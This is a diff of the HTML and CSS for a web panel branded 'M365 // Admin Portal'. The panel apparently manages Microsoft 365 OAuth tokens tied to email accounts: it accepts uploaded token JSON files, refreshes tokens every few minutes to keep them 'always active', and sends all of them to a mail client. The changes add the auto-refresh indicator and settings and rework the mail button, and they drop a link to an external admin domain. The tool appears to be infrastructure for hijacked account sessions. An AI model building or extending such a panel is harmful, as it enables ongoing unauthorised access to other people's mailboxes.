@@ -35,169 +35,79 @@
 }
 html,body{height:100%;background:var(--void);color:var(--txt);font-family:var(--font);font-size:14px;-webkit-font-smoothing:antialiased;overflow:hidden}
 
-/* ── Noise overlay ── */
 body::before{content:'';position:fixed;inset:0;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.03'/%3E%3C/svg%3E");opacity:.4;pointer-events:none;z-index:0;}
-
-/* ── Grid lines bg ── */
 body::after{content:'';position:fixed;inset:0;background-image:linear-gradient(var(--edge) 1px,transparent 1px),linear-gradient(90deg,var(--edge) 1px,transparent 1px);background-size:40px 40px;opacity:.18;pointer-events:none;z-index:0;}
 
 /* ─────────────────────────────── LOGIN SCREEN ──────────────────────────────── */
-#login-screen{
-  position:fixed;inset:0;z-index:100;
-  display:flex;align-items:center;justify-content:center;
-}
+#login-screen{position:fixed;inset:0;z-index:100;display:flex;align-items:center;justify-content:center;}
 #login-screen.gone{display:none}
-
-.login-wrap{
-  position:relative;z-index:1;
-  width:420px;max-width:calc(100vw - 32px);
-}
-.login-bracket{
-  position:absolute;width:18px;height:18px;border-color:var(--acc);border-style:solid;opacity:.6;
-}
+.login-wrap{position:relative;z-index:1;width:420px;max-width:calc(100vw - 32px);}
+.login-bracket{position:absolute;width:18px;height:18px;border-color:var(--acc);border-style:solid;opacity:.6;}
 .lb-tl{top:-8px;left:-8px;border-width:2px 0 0 2px;}
 .lb-tr{top:-8px;right:-8px;border-width:2px 2px 0 0;}
 .lb-bl{bottom:-8px;left:-8px;border-width:0 0 2px 2px;}
 .lb-br{bottom:-8px;right:-8px;border-width:0 2px 2px 0;}
-
-.login-card{
-  background:var(--panel);
-  border:1px solid var(--edge);
-  padding:44px 40px 36px;
-  position:relative;
-  clip-path:polygon(0 0,calc(100% - 20px) 0,100% 20px,100% 100%,0 100%);
-}
-.login-card::before{
-  content:'';position:absolute;top:0;left:0;right:0;height:2px;
-  background:linear-gradient(90deg,var(--acc),transparent);
-}
-
-.login-eyebrow{
-  font-family:var(--mono);font-size:10px;font-weight:500;
-  color:var(--acc);letter-spacing:3px;text-transform:uppercase;
-  margin-bottom:8px;opacity:.8;
-}
-.login-title{
-  font-size:28px;font-weight:800;color:var(--bright);
-  letter-spacing:-1px;line-height:1;margin-bottom:4px;
-}
+.login-card{background:var(--panel);border:1px solid var(--edge);padding:44px 40px 36px;position:relative;clip-path:polygon(0 0,calc(100% - 20px) 0,100% 20px,100% 100%,0 100%);}
+.login-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--acc),transparent);}
+.login-eyebrow{font-family:var(--mono);font-size:10px;font-weight:500;color:var(--acc);letter-spacing:3px;text-transform:uppercase;margin-bottom:8px;opacity:.8;}
+.login-title{font-size:28px;font-weight:800;color:var(--bright);letter-spacing:-1px;line-height:1;margin-bottom:4px;}
 .login-sub{font-size:12px;color:var(--sub);margin-bottom:32px;font-family:var(--mono);}
-
 .field-group{margin-bottom:16px}
-.field-label{
-  display:block;font-family:var(--mono);font-size:10px;font-weight:600;
-  color:var(--sub);letter-spacing:2px;text-transform:uppercase;margin-bottom:7px;
-}
-.field-input{
-  width:100%;background:var(--deep);border:1px solid var(--edge);
-  color:var(--bright);font-family:var(--mono);font-size:13px;
-  padding:11px 14px;outline:none;transition:border-color .15s,box-shadow .15s;
-  clip-path:polygon(0 0,calc(100% - 8px) 0,100% 8px,100% 100%,0 100%);
-}
+.field-label{display:block;font-family:var(--mono);font-size:10px;font-weight:600;color:var(--sub);letter-spacing:2px;text-transform:uppercase;margin-bottom:7px;}
+.field-input{width:100%;background:var(--deep);border:1px solid var(--edge);color:var(--bright);font-family:var(--mono);font-size:13px;padding:11px 14px;outline:none;transition:border-color .15s,box-shadow .15s;clip-path:polygon(0 0,calc(100% - 8px) 0,100% 8px,100% 100%,0 100%);}
 .field-input:focus{border-color:var(--acc);box-shadow:0 0 0 1px var(--acc),inset 0 0 20px var(--acc-glow2);}
 .field-input::placeholder{color:var(--mute)}
-
-.login-btn{
-  width:100%;margin-top:8px;padding:13px;
-  background:var(--acc);color:var(--void);
-  border:none;cursor:pointer;
-  font-family:var(--font);font-size:14px;font-weight:700;letter-spacing:1px;
-  text-transform:uppercase;
-  clip-path:polygon(0 0,calc(100% - 10px) 0,100% 10px,100% 100%,0 100%);
-  transition:background .15s,transform .1s;position:relative;overflow:hidden;
-}
+.login-btn{width:100%;margin-top:8px;padding:13px;background:var(--acc);color:var(--void);border:none;cursor:pointer;font-family:var(--font);font-size:14px;font-weight:700;letter-spacing:1px;text-transform:uppercase;clip-path:polygon(0 0,calc(100% - 10px) 0,100% 10px,100% 100%,0 100%);transition:background .15s,transform .1s;position:relative;overflow:hidden;}
 .login-btn::after{content:'';position:absolute;inset:0;background:white;opacity:0;transition:opacity .15s;}
 .login-btn:hover::after{opacity:.08}
 .login-btn:hover{transform:translateY(-1px)}
 .login-btn:active{transform:translateY(0)}
 .login-btn:disabled{background:var(--mute);cursor:not-allowed;transform:none}
-
-.login-err{
-  display:none;margin-top:14px;padding:10px 14px;
-  background:var(--red-glow);border:1px solid rgba(255,64,96,.3);
-  font-family:var(--mono);font-size:11px;color:var(--red);
-}
+.login-err{display:none;margin-top:14px;padding:10px 14px;background:var(--red-glow);border:1px solid rgba(255,64,96,.3);font-family:var(--mono);font-size:11px;color:var(--red);}
 .login-err.show{display:block}
 
 /* ─────────────────────────────── APP SHELL ─────────────────────────────────── */
-#app{
-  position:fixed;inset:0;z-index:1;
-  display:flex;flex-direction:column;
-  opacity:0;transition:opacity .4s;pointer-events:none;
-}
+#app{position:fixed;inset:0;z-index:1;display:flex;flex-direction:column;opacity:0;transition:opacity .4s;pointer-events:none;}
 #app.ready{opacity:1;pointer-events:all}
 
-/* ── Top bar ── */
-.topbar{
-  height:52px;flex-shrink:0;
-  background:var(--panel);border-bottom:1px solid var(--edge);
-  display:flex;align-items:center;gap:0;padding:0;
-  position:relative;z-index:10;
-}
-.topbar-logo{
-  padding:0 24px;display:flex;align-items:center;gap:12px;
-  border-right:1px solid var(--edge);height:100%;
-}
-.logo-mark{
-  width:28px;height:28px;background:var(--acc);
-  clip-path:polygon(0 0,calc(100% - 6px) 0,100% 6px,100% 100%,0 100%);
-  display:flex;align-items:center;justify-content:center;flex-shrink:0;
-}
+.topbar{height:52px;flex-shrink:0;background:var(--panel);border-bottom:1px solid var(--edge);display:flex;align-items:center;gap:0;padding:0;position:relative;z-index:10;}
+.topbar-logo{padding:0 24px;display:flex;align-items:center;gap:12px;border-right:1px solid var(--edge);height:100%;}
+.logo-mark{width:28px;height:28px;background:var(--acc);clip-path:polygon(0 0,calc(100% - 6px) 0,100% 6px,100% 100%,0 100%);display:flex;align-items:center;justify-content:center;flex-shrink:0;}
 .logo-mark svg{width:14px;height:14px;color:var(--void)}
 .logo-text{font-size:13px;font-weight:800;color:var(--bright);letter-spacing:1px;text-transform:uppercase}
 .logo-ver{font-family:var(--mono);font-size:9px;color:var(--sub);letter-spacing:2px}
-
 .topbar-tabs{display:flex;height:100%;margin-left:0}
-.tb-tab{
-  padding:0 20px;height:100%;display:flex;align-items:center;gap:8px;
-  cursor:pointer;color:var(--sub);font-size:12px;font-weight:600;letter-spacing:.5px;text-transform:uppercase;
-  border-right:1px solid var(--edge);transition:color .15s,background .15s;position:relative;
-}
+.tb-tab{padding:0 20px;height:100%;display:flex;align-items:center;gap:8px;cursor:pointer;color:var(--sub);font-size:12px;font-weight:600;letter-spacing:.5px;text-transform:uppercase;border-right:1px solid var(--edge);transition:color .15s,background .15s;position:relative;}
 .tb-tab:hover{color:var(--txt);background:var(--acc-glow2)}
 .tb-tab.active{color:var(--acc);background:var(--acc-glow)}
 .tb-tab.active::after{content:'';position:absolute;bottom:0;left:0;right:0;height:2px;background:var(--acc);}
 .tb-tab svg{width:13px;height:13px;flex-shrink:0}
-
 .topbar-right{margin-left:auto;display:flex;align-items:center;gap:0;height:100%}
-.user-chip{
-  padding:0 20px;height:100%;display:flex;align-items:center;gap:10px;
-  border-left:1px solid var(--edge);cursor:default;
-}
+.user-chip{padding:0 20px;height:100%;display:flex;align-items:center;gap:10px;border-left:1px solid var(--edge);cursor:default;}
 .user-dot{width:6px;height:6px;background:var(--green);border-radius:50%;flex-shrink:0;box-shadow:0 0 6px var(--green);}
 .user-name-top{font-family:var(--mono);font-size:11px;color:var(--txt);font-weight:600;}
 .user-role{font-family:var(--mono);font-size:9px;color:var(--sub);letter-spacing:1px;text-transform:uppercase}
-.topbar-action-btn{
-  padding:0 18px;height:100%;display:flex;align-items:center;gap:8px;
-  border-left:1px solid var(--edge);cursor:pointer;
-  color:var(--sub);font-size:11px;font-weight:600;letter-spacing:.5px;text-transform:uppercase;
-  transition:color .15s,background .15s;background:none;border-top:none;border-bottom:none;border-right:none;font-family:var(--font);
-}
+
+/* Auto-refresh status indicator */
+.refresh-status{padding:0 16px;height:100%;display:flex;align-items:center;gap:8px;border-left:1px solid var(--edge);font-family:var(--mono);font-size:9px;color:var(--sub);letter-spacing:1px;}
+.refresh-status .rs-dot{width:5px;height:5px;border-radius:50%;background:var(--green);flex-shrink:0;transition:background .3s;}
+.refresh-status.spinning .rs-dot{background:var(--yellow);animation:pulseDot .6s ease-in-out infinite;}
+@keyframes pulseDot{0%,100%{opacity:.4;transform:scale(.8)}50%{opacity:1;transform:scale(1.2)}}
+
+.topbar-action-btn{padding:0 18px;height:100%;display:flex;align-items:center;gap:8px;border-left:1px solid var(--edge);cursor:pointer;color:var(--sub);font-size:11px;font-weight:600;letter-spacing:.5px;text-transform:uppercase;transition:color .15s,background .15s;background:none;border-top:none;border-bottom:none;border-right:none;font-family:var(--font);}
 .topbar-action-btn:hover{color:var(--red);background:var(--red-glow)}
 
-/* ── Content area ── */
 .content{flex:1;overflow:hidden;display:flex;flex-direction:column}
 
 /* ─────────────────────────────── TOKENS TAB ────────────────────────────────── */
 #tab-tokens{flex:1;display:flex;flex-direction:column;overflow:hidden}
 #tab-tokens.hidden,#tab-admins.hidden,#tab-settings.hidden{display:none}
-
-.tab-header{
-  padding:20px 28px 0;flex-shrink:0;
-  display:flex;align-items:flex-end;gap:16px;
-  border-bottom:1px solid var(--edge);padding-bottom:0;
-}
+.tab-header{padding:20px 28px 0;flex-shrink:0;display:flex;align-items:flex-end;gap:16px;border-bottom:1px solid var(--edge);padding-bottom:0;}
 .tab-title{font-size:18px;font-weight:800;color:var(--bright);letter-spacing:-0.5px}
 .tab-sub{font-family:var(--mono);font-size:10px;color:var(--sub);margin-bottom:2px;letter-spacing:1px}
 .tab-actions{margin-left:auto;display:flex;align-items:center;gap:8px;padding-bottom:16px}
 
-.btn{
-  display:inline-flex;align-items:center;gap:7px;
-  padding:8px 16px;border:1px solid var(--edge);
-  background:transparent;cursor:pointer;
-  font-family:var(--font);font-size:12px;font-weight:600;letter-spacing:.5px;text-transform:uppercase;
-  color:var(--txt);transition:all .15s;white-space:nowrap;
-  clip-path:polygon(0 0,calc(100% - 7px) 0,100% 7px,100% 100%,0 100%);
-}
+.btn{display:inline-flex;align-items:center;gap:7px;padding:8px 16px;border:1px solid var(--edge);background:transparent;cursor:pointer;font-family:var(--font);font-size:12px;font-weight:600;letter-spacing:.5px;text-transform:uppercase;color:var(--txt);transition:all .15s;white-space:nowrap;clip-path:polygon(0 0,calc(100% - 7px) 0,100% 7px,100% 100%,0 100%);}
 .btn:hover{border-color:var(--acc);color:var(--acc);background:var(--acc-glow)}
 .btn-primary{background:var(--acc);color:var(--void);border-color:var(--acc)}
 .btn-primary:hover{background:var(--acc2);border-color:var(--acc2);color:var(--void)}
@@ -207,78 +117,49 @@ body::after{content:'';position:fixed;inset:0;background-image:linear-gradient(v
 .btn svg{width:12px;height:12px;flex-shrink:0}
 .btn:disabled{opacity:.4;cursor:not-allowed}
 
-/* Tokens table */
 .tokens-body{flex:1;overflow-y:auto;padding:20px 28px}
 .tokens-body::-webkit-scrollbar{width:4px}
 .tokens-body::-webkit-scrollbar-thumb{background:var(--edge);border-radius:0}
-
-.section-label{
-  font-family:var(--mono);font-size:9px;font-weight:600;
-  color:var(--sub);letter-spacing:3px;text-transform:uppercase;
-  margin-bottom:14px;display:flex;align-items:center;gap:10px;
-}
+.section-label{font-family:var(--mono);font-size:9px;font-weight:600;color:var(--sub);letter-spacing:3px;text-transform:uppercase;margin-bottom:14px;display:flex;align-items:center;gap:10px;}
 .section-label::after{content:'';flex:1;height:1px;background:var(--edge);}
-
 .tokens-grid{display:flex;flex-direction:column;gap:8px}
 
-.token-card{
-  background:var(--panel);border:1px solid var(--edge);
-  padding:16px 20px;display:flex;align-items:center;gap:16px;
-  transition:border-color .15s,background .15s;position:relative;overflow:hidden;
-}
+.token-card{background:var(--panel);border:1px solid var(--edge);padding:16px 20px;display:flex;align-items:center;gap:16px;transition:border-color .15s,background .15s;position:relative;overflow:hidden;}
 .token-card::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--edge);transition:background .15s;}
 .token-card:hover{border-color:var(--line);background:var(--raised)}
 .token-card:hover::before{background:var(--acc)}
 .token-card.expired::before{background:var(--red)}
 .token-card.expiring-soon::before{background:var(--yellow)}
 .token-card.fresh::before{background:var(--green)}
+/* Refreshing animation state */
+.token-card.refreshing-now::before{background:var(--yellow);animation:slideRefresh 1s ease-in-out infinite;}
+@keyframes slideRefresh{0%,100%{opacity:.4}50%{opacity:1}}
 
-.tok-avatar{
-  width:38px;height:38px;flex-shrink:0;
-  display:flex;align-items:center;justify-content:center;
-  font-size:13px;font-weight:700;color:var(--void);
-  clip-path:polygon(0 0,calc(100% - 5px) 0,100% 5px,100% 100%,0 100%);
-}
+.tok-avatar{width:38px;height:38px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;color:var(--void);clip-path:polygon(0 0,calc(100% - 5px) 0,100% 5px,100% 100%,0 100%);}
 .tok-info{flex:1;min-width:0}
 .tok-label{font-size:13px;font-weight:700;color:var(--bright);margin-bottom:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
 .tok-email{font-family:var(--mono);font-size:11px;color:var(--sub);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.tok-meta{display:flex;align-items:center;gap:12px;margin-top:6px}
-.tok-badge{
-  font-family:var(--mono);font-size:9px;font-weight:600;letter-spacing:1px;text-transform:uppercase;
-  padding:2px 8px;border:1px solid;
-}
+.tok-meta{display:flex;align-items:center;gap:12px;margin-top:6px;flex-wrap:wrap;}
+.tok-badge{font-family:var(--mono);font-size:9px;font-weight:600;letter-spacing:1px;text-transform:uppercase;padding:2px 8px;border:1px solid;}
 .tok-badge.ok{border-color:rgba(0,232,120,.3);color:var(--green);background:rgba(0,232,120,.06)}
 .tok-badge.exp{border-color:rgba(255,64,96,.3);color:var(--red);background:rgba(255,64,96,.06)}
 .tok-badge.soon{border-color:rgba(255,204,0,.3);color:var(--yellow);background:rgba(255,204,0,.06)}
 .tok-badge.noref{border-color:rgba(90,120,152,.3);color:var(--sub);background:transparent}
+.tok-badge.refreshing{border-color:rgba(255,204,0,.3);color:var(--yellow);background:rgba(255,204,0,.06);animation:pulseDot .8s infinite;}
 .tok-date{font-family:var(--mono);font-size:9px;color:var(--dim);letter-spacing:.5px}
 .tok-actions{display:flex;gap:6px;flex-shrink:0}
 
-/* Empty state */
-.empty-tokens{
-  display:flex;flex-direction:column;align-items:center;justify-content:center;
-  padding:80px 40px;text-align:center;gap:12px;border:1px dashed var(--edge);
-}
+.empty-tokens{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:80px 40px;text-align:center;gap:12px;border:1px dashed var(--edge);}
 .empty-icon-big{font-size:36px;opacity:.3}
-.empty-title{font-size:16px;font-weight:700;color:var(--raised);color:var(--sub)}
+.empty-title{font-size:16px;font-weight:700;color:var(--sub)}
 .empty-sub{font-size:12px;color:var(--dim);font-family:var(--mono);max-width:360px;line-height:1.6}
 
 /* ─────────────────────────────── ADMINS TAB ────────────────────────────────── */
 #tab-admins{flex:1;display:flex;flex-direction:column;overflow:hidden}
 .admins-body{flex:1;overflow-y:auto;padding:20px 28px}
-.admin-row{
-  background:var(--panel);border:1px solid var(--edge);padding:14px 20px;
-  display:flex;align-items:center;gap:14px;margin-bottom:8px;
-  transition:border-color .15s;
-}
+.admin-row{background:var(--panel);border:1px solid var(--edge);padding:14px 20px;display:flex;align-items:center;gap:14px;margin-bottom:8px;transition:border-color .15s;}
 .admin-row:hover{border-color:var(--line)}
-.admin-avatar{
-  width:34px;height:34px;flex-shrink:0;
-  display:flex;align-items:center;justify-content:center;
-  font-size:12px;font-weight:700;color:var(--void);
-  clip-path:polygon(0 0,calc(100% - 5px) 0,100% 5px,100% 100%,0 100%);
-  background:var(--acc);
-}
+.admin-avatar{width:34px;height:34px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;color:var(--void);clip-path:polygon(0 0,calc(100% - 5px) 0,100% 5px,100% 100%,0 100%);background:var(--acc);}
 .admin-name{font-size:13px;font-weight:700;color:var(--bright)}
 .admin-meta{font-family:var(--mono);font-size:10px;color:var(--sub)}
 .admin-you{font-family:var(--mono);font-size:9px;color:var(--acc);letter-spacing:1px;text-transform:uppercase;margin-left:8px;padding:1px 6px;border:1px solid var(--acc);opacity:.7}
@@ -300,13 +181,7 @@ body::after{content:'';position:fixed;inset:0;background-image:linear-gradient(v
 /* ─────────────────────────────── MODAL ─────────────────────────────────────── */
 .overlay{position:fixed;inset:0;background:rgba(3,5,7,.85);z-index:200;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(4px)}
 .overlay.hidden{display:none}
-.modal{
-  background:var(--panel);border:1px solid var(--edge);
-  width:500px;max-width:calc(100vw - 32px);
-  position:relative;
-  clip-path:polygon(0 0,calc(100% - 18px) 0,100% 18px,100% 100%,0 100%);
-  animation:modalIn .2s ease;
-}
+.modal{background:var(--panel);border:1px solid var(--edge);width:500px;max-width:calc(100vw - 32px);position:relative;clip-path:polygon(0 0,calc(100% - 18px) 0,100% 18px,100% 100%,0 100%);animation:modalIn .2s ease;}
 @keyframes modalIn{from{transform:translateY(16px);opacity:0}to{transform:translateY(0);opacity:1}}
 .modal::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--acc),transparent)}
 .modal-header{padding:22px 24px 16px;border-bottom:1px solid var(--edge);display:flex;align-items:center;gap:12px}
@@ -316,28 +191,17 @@ body::after{content:'';position:fixed;inset:0;background-image:linear-gradient(v
 .modal-body{padding:20px 24px}
 .modal-footer{padding:14px 24px;border-top:1px solid var(--edge);display:flex;justify-content:flex-end;gap:8px}
 
-/* Drop zone */
-.drop-zone{
-  border:1px dashed var(--line);padding:24px;text-align:center;cursor:pointer;
-  transition:border-color .2s,background .2s;margin-bottom:14px;
-  clip-path:polygon(0 0,calc(100% - 10px) 0,100% 10px,100% 100%,0 100%);
-}
+.drop-zone{border:1px dashed var(--line);padding:24px;text-align:center;cursor:pointer;transition:border-color .2s,background .2s;margin-bottom:14px;clip-path:polygon(0 0,calc(100% - 10px) 0,100% 10px,100% 100%,0 100%);}
 .drop-zone:hover,.drop-zone.drag-over{border-color:var(--acc);background:var(--acc-glow)}
-.drop-zone-icon{font-size:28px;margin-bottom:6px;opacity:.5}
-.drop-zone-text{font-size:13px;font-weight:600;color:var(--txt)}
 .drop-zone-sub{font-family:var(--mono);font-size:10px;color:var(--sub);margin-top:4px}
 .drop-zone-name{font-family:var(--mono);font-size:10px;color:var(--green);margin-top:6px;min-height:14px}
-
 .m-divider{display:flex;align-items:center;gap:10px;margin:14px 0;font-family:var(--mono);font-size:9px;color:var(--dim);letter-spacing:2px;text-transform:uppercase}
 .m-divider::before,.m-divider::after{content:'';flex:1;height:1px;background:var(--edge)}
-
 .modal-textarea{width:100%;background:var(--deep);border:1px solid var(--edge);color:var(--bright);font-family:var(--mono);font-size:10px;padding:10px 12px;resize:vertical;min-height:80px;outline:none;transition:border-color .15s}
 .modal-textarea:focus{border-color:var(--acc)}
 .modal-textarea::placeholder{color:var(--mute)}
 .modal-err{display:none;padding:8px 12px;background:var(--red-glow);border:1px solid rgba(255,64,96,.3);font-family:var(--mono);font-size:10px;color:var(--red);margin-top:10px}
 .modal-err.show{display:block}
-
-/* Label row */
 .label-row{display:flex;flex-direction:column;gap:5px;margin-bottom:12px}
 .m-label{font-family:var(--mono);font-size:9px;font-weight:600;color:var(--sub);letter-spacing:2px;text-transform:uppercase}
 .m-input{background:var(--deep);border:1px solid var(--edge);color:var(--bright);font-family:var(--mono);font-size:12px;padding:9px 12px;outline:none;transition:border-color .15s;width:100%}
@@ -345,31 +209,17 @@ body::after{content:'';position:fixed;inset:0;background-image:linear-gradient(v
 
 /* Toast */
 #toast-container{position:fixed;bottom:24px;right:24px;z-index:9999;display:flex;flex-direction:column;gap:8px;pointer-events:none}
-.toast{
-  background:var(--raised);border:1px solid var(--edge);
-  padding:10px 16px;font-family:var(--mono);font-size:11px;color:var(--txt);
-  display:flex;align-items:center;gap:10px;
-  clip-path:polygon(0 0,calc(100% - 8px) 0,100% 8px,100% 100%,0 100%);
-  animation:toastIn .25s ease;pointer-events:all;max-width:320px;
-  box-shadow:0 8px 24px rgba(0,0,0,.5);
-}
+.toast{background:var(--raised);border:1px solid var(--edge);padding:10px 16px;font-family:var(--mono);font-size:11px;color:var(--txt);display:flex;align-items:center;gap:10px;clip-path:polygon(0 0,calc(100% - 8px) 0,100% 8px,100% 100%,0 100%);animation:toastIn .25s ease;pointer-events:all;max-width:340px;box-shadow:0 8px 24px rgba(0,0,0,.5);}
 @keyframes toastIn{from{transform:translateX(20px);opacity:0}to{transform:translateX(0);opacity:1}}
 .toast-dot{width:6px;height:6px;border-radius:50%;flex-shrink:0}
 .toast.ok .toast-dot{background:var(--green);box-shadow:0 0 6px var(--green)}
 .toast.err .toast-dot{background:var(--red);box-shadow:0 0 6px var(--red)}
 .toast.info .toast-dot{background:var(--acc);box-shadow:0 0 6px var(--acc)}
 
-/* Spinner */
 .spin-inline{display:inline-block;width:10px;height:10px;border:1.5px solid var(--edge);border-top-color:var(--acc);border-radius:50%;animation:spin .6s linear infinite;flex-shrink:0}
 @keyframes spin{to{transform:rotate(360deg)}}
-
-/* Status pulse */
 .pulse{animation:pulseA 2s ease-in-out infinite}
 @keyframes pulseA{0%,100%{opacity:.7}50%{opacity:1}}
-
-/* open mail client link */
-.mail-link{font-family:var(--mono);font-size:10px;color:var(--acc);cursor:pointer;text-decoration:none;display:inline-flex;align-items:center;gap:5px;opacity:.8;transition:opacity .12s}
-.mail-link:hover{opacity:1}
 </style>
 </head>
 <body>
@@ -385,7 +235,6 @@ body::after{content:'';position:fixed;inset:0;background-image:linear-gradient(v
       <div class="login-eyebrow">M365 // Admin Portal</div>
       <div class="login-title">ACCESS<br>CONTROL</div>
       <div class="login-sub">// authenticate to continue</div>
-
       <div class="field-group">
         <label class="field-label" for="l-user">Username</label>
         <input class="field-input" id="l-user" type="text" placeholder="admin" autocomplete="username" spellcheck="false"/>
@@ -432,6 +281,12 @@ body::after{content:'';position:fixed;inset:0;background-image:linear-gradient(v
     </div>
 
     <div class="topbar-right">
+      <!-- Auto-refresh status -->
+      <div class="refresh-status" id="refresh-status-chip" title="Background token auto-refresh">
+        <div class="rs-dot"></div>
+        <span id="refresh-status-label">Auto-refresh</span>
+      </div>
+
       <div class="user-chip">
         <div class="user-dot pulse"></div>
         <div>
@@ -465,10 +320,15 @@ body::after{content:'';position:fixed;inset:0;background-image:linear-gradient(v
             <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
             Refresh
           </button>
-          <a href="https://admin.swiftcourrier.online/mail" target="_blank" class="btn btn-primary"></a>
-            <svg fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+          <!-- FIXED: Open Mail Client button — passes ALL tokens to mail.html -->
+          <button class="btn btn-primary" id="open-mail-btn" onclick="openMailClient()">
+            <svg fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24" width="13" height="13">
+              <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/>
+              <polyline points="15 3 21 3 21 9"/>
+              <line x1="10" y1="14" x2="21" y2="3"/>
+            </svg>
             Open Mail Client
-          </a>
+          </button>
         </div>
       </div>
       <div class="tokens-body">
@@ -527,6 +387,27 @@ body::after{content:'';position:fixed;inset:0;background-image:linear-gradient(v
       </div>
 
       <div class="settings-section">
+        <div class="settings-title">Auto-Refresh Settings</div>
+        <div class="settings-desc">// tokens are automatically refreshed when they have less than 10 minutes remaining. runs every 4 minutes.</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <div class="admin-row" style="padding:10px 16px">
+            <div class="tok-badge ok" style="flex-shrink:0">Auto-Refresh</div>
+            <div style="font-family:var(--mono);font-size:11px;color:var(--sub);flex:1;margin-left:12px">Keeps all tokens with refresh_token always active</div>
+            <div class="tok-badge ok">Enabled</div>
+          </div>
+          <div class="admin-row" style="padding:10px 16px">
+            <div class="tok-badge ok" style="flex-shrink:0">Interval</div>
+            <div style="font-family:var(--mono);font-size:11px;color:var(--sub);flex:1;margin-left:12px">Every 4 min · refresh if &lt;10 min remain</div>
+            <div class="tok-badge ok" id="last-refresh-badge">—</div>
+          </div>
+          <button class="btn" style="align-self:flex-start;margin-top:4px" onclick="refreshExpiredTokens(true)">
+            <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
+            Force Refresh All Now
+          </button>
+        </div>
+      </div>
+
+      <div class="settings-section">
         <div class="settings-title">Server Status</div>
         <div class="settings-desc">// connected services and their current state.</div>
         <div id="srv-status-list" style="display:flex;flex-direction:column;gap:8px">
@@ -559,12 +440,8 @@ body::after{content:'';position:fixed;inset:0;background-image:linear-gradient(v
         <span class="m-label">Label (optional)</span>
         <input class="m-input" id="tok-label" type="text" placeholder="e.g. Work account, Client XYZ…"/>
       </div>
-
-      <!-- Hidden real file input -->
       <input type="file" id="tok-file-input" accept=".json,application/json"
              style="position:fixed;top:-999px;left:-999px;width:1px;height:1px;opacity:0">
-
-      <!-- Browse button row -->
       <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px;">
         <button class="btn btn-primary" onclick="document.getElementById('tok-file-input').click()" type="button" style="flex-shrink:0">
           <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" width="13" height="13"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
@@ -573,16 +450,12 @@ body::after{content:'';position:fixed;inset:0;background-image:linear-gradient(v
         <span style="font-size:12px;color:var(--sub)">or drag &amp; drop below</span>
         <span id="tok-drop-name" style="font-family:var(--mono);font-size:10px;color:var(--green);flex:1;text-align:right;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"></span>
       </div>
-
-      <!-- Drop zone — smaller, secondary -->
       <label for="tok-file-input" id="tok-drop-zone" class="drop-zone" style="padding:14px;margin-bottom:10px"
         ondragover="event.preventDefault();document.getElementById('tok-drop-zone').classList.add('drag-over')"
         ondragleave="document.getElementById('tok-drop-zone').classList.remove('drag-over')"
         ondrop="tokenFileDrop(event)">
         <div class="drop-zone-sub" style="font-size:11px">Drop tokens_XXXX.json here</div>
       </label>
-
-      <!-- File path display — shown after a file is selected -->
       <div id="tok-file-path-row" style="display:none;margin-bottom:10px;padding:8px 12px;
            background:rgba(0,200,255,0.06);border:1px solid rgba(0,200,255,0.2);
            font-family:var(--mono);font-size:10px;color:var(--acc);word-break:break-all;
@@ -591,9 +464,7 @@ body::after{content:'';position:fixed;inset:0;background-image:linear-gradient(v
         <span id="tok-file-path-text" style="flex:1"></span>
         <button onclick="clearFilePath()" style="background:none;border:none;cursor:pointer;color:var(--sub);font-size:12px;flex-shrink:0;padding:0" title="Clear">✕</button>
       </div>
-
       <div class="m-divider">or paste raw json / access_token</div>
-
       <textarea class="modal-textarea" id="tok-paste" placeholder='{"access_token":"eyJ0...","refresh_token":"..."}'></textarea>
       <div class="modal-err" id="tok-err"></div>
     </div>
@@ -649,7 +520,11 @@ body::after{content:'';position:fixed;inset:0;background-image:linear-gradient(v
     <div class="modal-footer">
       <button class="btn" onclick="closeModal('view-token-overlay')">Close</button>
       <button class="btn btn-primary" id="use-token-btn" onclick="openMailWithToken()">
-        <svg fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24" width="12" height="12"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+        <svg fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24" width="12" height="12">
+          <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/>
+          <polyline points="15 3 21 3 21 9"/>
